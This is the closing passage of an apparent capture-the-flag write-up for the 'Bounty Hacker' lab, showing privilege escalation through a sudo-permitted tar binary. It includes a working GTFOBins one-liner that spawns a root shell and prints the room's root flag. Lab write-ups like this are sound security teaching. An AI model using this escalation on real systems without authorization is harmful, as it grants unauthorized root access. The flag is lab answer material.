</code></pre><hr>
<p><strong>Privilege Escalation</strong></p>
<p>In order to reach the root flag the first thing I did was run the following command. </p>
<pre><code>lin<span class="hljs-variable">@bountyhacker</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>sudo -l
[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">lin:</span> 
Matching Defaults entries <span class="hljs-keyword">for</span> lin on <span class="hljs-symbol">bountyhacker:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>

User lin may run the following commands on <span class="hljs-symbol">bountyhacker:</span>
    (root) /bin/tar
</code></pre><p>Lin has root privileges to execute the /bin/tar command</p>
<p>I then went to <a href="https://gtfobins.github.io/gtfobins/tar/#sudo">GTFOBins</a> and searched for tar. GTFOBins describes itself as a curated list of Unix binaries that can be used to bypass local security restrictions in misconfiguration systems</p>
<p>Running the following command allowed me to get a root shell and read the root.txt flag located in the root directory</p>
<pre><code>lin<span class="hljs-variable">@bountyhacker</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>sudo tar -cf /dev/null /dev/null --checkpoint=<span class="hljs-number">1</span> --checkpoint-action=exec=<span class="hljs-regexp">/bin/sh</span>
<span class="hljs-symbol">tar:</span> Removing leading `/<span class="hljs-string">' from member names
# ls /root
root.txt
# cat /root/root.txt
THM{80UN7Y_h4cK3r}</span>
</code></pre>
